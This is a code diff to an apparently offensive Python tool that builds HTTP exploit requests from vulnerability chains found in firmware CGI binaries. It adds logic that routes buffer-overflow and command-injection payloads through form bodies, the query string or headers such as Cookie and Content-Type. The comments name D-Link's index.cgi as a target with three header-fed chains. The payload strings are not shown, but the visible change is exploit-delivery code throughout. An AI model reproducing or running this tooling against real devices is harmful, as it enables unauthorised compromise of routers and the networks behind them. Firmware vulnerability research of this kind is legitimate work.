@@ -98,6 +98,45 @@ def shell_payloads(cmd: str) -> list[str]:
     ]
 
 
+_HEADER_OF = {
+    "http_cookie": "Cookie",
+    "cookie": "Cookie",
+    "content_type": "Content-Type",
+    "http_user_agent": "User-Agent",
+    "http_referer": "Referer",
+    "http_host": "Host",
+    "http_x_forwarded_for": "X-Forwarded-For",
+}
+
+
+def channel_of(chain: dict) -> tuple[str, str]:
+    """这条链的入口是哪一种：表单字段 / 请求头 / 查询串。
+
+    为什么必须区分：`getenv(HTTP_COOKIE)` 这种源，把载荷塞进表单 body 是**打不中**的 ——
+    程序读的是 Cookie 头。实测 D-Link 的 index.cgi 就有三条这样的链
+    （Cookie / Content-Type → strcpy），不换通道等于白打。
+    """
+    api = (chain.get("source_api") or "").lower()
+    param = (chain.get("source_param") or "").strip()
+    if "cookie" in api:
+        return "header", "Cookie"
+    if "content_type" in api:
+        return "header", "Content-Type"
+    m = re.search(r"getenv\s*\(\s*([A-Z_]+)", chain.get("guard") or "")
+    key = (m.group(1).lower() if m else "")
+    if key in _HEADER_OF:
+        return "header", _HEADER_OF[key]
+    if "http_" in api:
+        name = api.split("http_", 1)[1].upper().replace("_", "-")
+        return "header", name.title()
+    if "request_uri" in api or "query_string" in api:
+        return "query", param or "x"
+    for k in _HEADER_OF:
+        if k in api:
+            return "header", _HEADER_OF[k]
+    return "form", param
+
+
 def build_requests(chain: dict, endpoint: dict | None = None,
                    port: int = 8080, host: str = "127.0.0.1",
                    cmd: str | None = None) -> list[dict]:
@@ -115,26 +154,50 @@ def build_requests(chain: dict, endpoint: dict | None = None,
         or guess_param(chain)
     cat = (chain.get("sink_category") or "").lower()
     values = shell_payloads(cmd) if (cmd and cat in ("ci", "cmd")) else payloads(cat)
+    channel, hdr = channel_of(chain)
+    if channel == "header":
+        # 头注入：载荷放进 Cookie / Content-Type 这类头里，body 留空
+        param = hdr
     out = []
     for value in values:
-        body = urllib.parse.urlencode({param: value})
+        if channel == "header":
+            path_ = path
+            body = ""
+            headers = {"Host": f"{host}:{port}", hdr: value,
+                       "Content-Length": "0", "Connection": "close"}
+            method = "GET"
+            desc = f"{hdr} 头塞 {len(value)} 字节"
+        elif channel == "query":
+            sep = "&" if "?" in path else "?"
+            path_ = f"{path}{sep}{urllib.parse.urlencode({param: value})}"
+            body = ""
+            headers = {"Host": f"{host}:{port}", "Connection": "close"}
+            method = "GET"
+            desc = f"查询串 {param} 塞 {len(value)} 字节"
+        else:
+            path_ = path
+            body = urllib.parse.urlencode({param: value})
+            headers = {"Host": f"{host}:{port}",
+                       "Content-Type": "application/x-www-form-urlencoded",
+                       "Content-Length": str(len(body)),
+                       "Connection": "close"}
+            method = "POST"
+            desc = (f"{param} 塞 {len(value)} 字节 "
+                    f"{'命令注入' if cat in ('ci', 'cmd') else '数据'}")
         out.append({
             "function": fn,
             "sink": chain.get("sink"),
             "sink_category": cat,
             "param": param,
             "value": value,
-            "path": path,
-            "method": "POST",
+            "path": path_,
+            "method": method,
             "host": host,
             "port": port,
-            "headers": {"Host": f"{host}:{port}",
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Content-Length": str(len(body)),
-                        "Connection": "close"},
+            "headers": headers,
             "body": body,
-            "desc": f"{param} 塞 {len(value)} 字节 "
-                    f"{'命令注入' if cat in ('ci', 'cmd') else '数据'}",
+            "channel": channel,
+            "desc": desc,
         })
     return out
 
